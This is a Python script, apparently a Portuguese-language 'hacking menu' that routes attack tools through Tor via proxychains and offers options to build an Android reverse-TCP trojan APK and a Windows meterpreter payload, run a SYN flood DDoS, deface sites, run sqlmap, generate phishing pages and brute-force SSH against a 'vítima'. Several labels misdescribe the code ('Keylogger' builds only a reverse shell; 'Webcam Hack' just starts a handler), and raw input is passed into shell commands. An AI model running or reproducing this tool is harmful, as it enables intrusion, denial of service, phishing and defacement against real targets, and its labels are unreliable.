import os
import time

def instalar_proxychain():
    print("\033[1;32m[*] Instalando proxychains...\033[0m")
    os.system("apt update && apt install -y proxychains")

    print("\033[1;32m[*] Configurando proxychains...\033[0m")

    conf_path = "/etc/proxychains.conf"
    backup_path = "/etc/proxychains.conf.bak"

    
    if not os.path.exists(backup_path):
        os.system(f"cp {conf_path} {backup_path}")

    
    os.system(f"sed -i 's/^#dynamic_chain/dynamic_chain/' {conf_path}")
    os.system(f"sed -i 's/^strict_chain/#strict_chain/' {conf_path}")
    os.system(f"sed -i 's/^#proxy_dns/proxy_dns/' {conf_path}")

    
    os.system(f"sed -i '/socks5 127.0.0.1 9050/d' {conf_path}")


    os.system(f"echo 'socks5 127.0.0.1 9050' >> {conf_path}")

    time.sleep(1)
    print("\033[1;32m[*] Proxychains tunado com sucesso!\033[0m")

def banner():
    os.system("clear")
    print("\033[1;32m")  # Terminal verde
    print("""
⠀⠀⠀⠀⠀⣶⡆⠀⠀⠀⢀⣴⢦⠀⠀⠀⠀⣖⡶⠀⠀⠀⠀⡏⡧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣷⡀⠀⠀⢀⣿⣧⡀⠀⠀⢠⣾⣧⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣦⡀⣼⣿⣿⣷⡀⢠⣿⣿⣿⡆⢀⣾⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠋⠙⢿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠠⣤⣉⣙⠛⠛⠛⠿⠿⠁⣴⣦⡈⠻⠛⠛⠛⢛⣉⣁⡤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠶⣶⣆⠈⢿⡿⠃⣠⣶⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣶⣶⣤⣤⣤⣤⡀⢁⣠⣤⣤⣤⣶⣶⣿⣿⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⡏⠉⠙⠛⠿⢿⣿⣿⣾⣿⡿⠿⠛⠋⠉⠹⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠻⢿⣧⣀⠀⠀⣀⣀⣼⡿⣿⣯⣀⣀⠀⠀⣀⣼⡿⠗⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⠁⠘⣿⣿⣿⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣇⣀⣀⣹⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠿⣿⡿⢿⣿⠿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡇⢀⣿⡇⢸⣿⡀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
------> F U C K Y O U  M E N U  BY JHON  <------

[01] Criar Trojan
[02] Ataque DDoS
[03] Deface Page
[04] SQLi Injector
[05] Webcam Hack
[06] Escanear Portas (Nmap)
[07] Gerar Página Phishing
[08] Criar Keylogger
[09] Captura de Pacotes Wi-Fi (Aircrack-ng)
[10] Exploits do Metasploit
[11] Brute Force SSH (Hydra)
[00] Sair
\033[0m
""")

def criar_trojan():
    lhost = input("LHOST > ")
    lport = input("LPORT > ")
    nome = input("Nome do APK > ")
    os.system(f"proxychains msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {nome}.apk")
    input("Trojan criado. Pressione Enter para continuar...")

def ataque_ddos():
    ip = input("IP do alvo > ")
    porta = input("Porta > ")
    os.system(f"proxychains hping3 -S {ip} -p {porta} --flood")
    input("Pressione Enter para continuar...")

def deface():
    site = input("URL do site > ")
    page = input("Página do deface (ex: index.html) > ")
    os.system(f"proxychains curl -T {page} {site}")
    input("Pressione Enter para continuar...")

def sqli():
    alvo = input("URL vulnerável > ")
    os.system(f"proxychains sqlmap -u {alvo} --dbs")
    input("Pressione Enter para continuar...")

def webcam_hack():
    ip = input("IP da vítima > ")
    porta = input("Porta > ")
    os.system(f"proxychains msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT {porta}; exploit'")
    input("Pressione Enter para continuar...")

def escanear_portas():
    alvo = input("IP alvo > ")
    os.system(f"proxychains nmap {alvo}")
    input("Pressione Enter para continuar...")

def gerar_phishing():
    site = input("URL do site alvo > ")
    os.system(f"proxychains python3 phishing_page.py {site}")
    input("Pressione Enter para continuar...")

def criar_keylogger():
    os.system("proxychains msfvenom -p windows/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=SUA_PORTA -f exe -o keylogger.exe")
    input("Keylogger criado. Pressione Enter para continuar...")

def captura_wifi():
    os.system("proxychains airodump-ng wlan0")
    input("Pressione Enter para continuar...")

def exploits_metasploit():
    os.system("proxychains msfconsole")
    input("Pressione Enter para continuar...")

def brute_force_ssh():
    ip = input("IP da vítima > ")
    usuario = input("Usuário SSH > ")
    wordlist = input("Wordlist > ")
    os.system(f"proxychains hydra -l {usuario} -P {wordlist} ssh://{ip}")
    input("Pressione Enter para continuar...")

def menu():
    while True:
        banner()
        op = input("Selecione uma opção > ")
        if op == "1": criar_trojan()
        elif op == "2": ataque_ddos()
        elif op == "3": deface()
        elif op == "4": sqli()
        elif op == "5": webcam_hack()
        elif op == "6": escanear_portas()
        elif op == "7": gerar_phishing()
        elif op == "8": criar_keylogger()
        elif op == "9": captura_wifi()
        elif op == "10": exploits_metasploit()
        elif op == "11": brute_force_ssh()
        elif op == "0":
            print("Saindo...")
            break
        else:
            print("Opção inválida!")
            time.sleep(1)

# Executa tudo
instalar_proxychain()
menu()
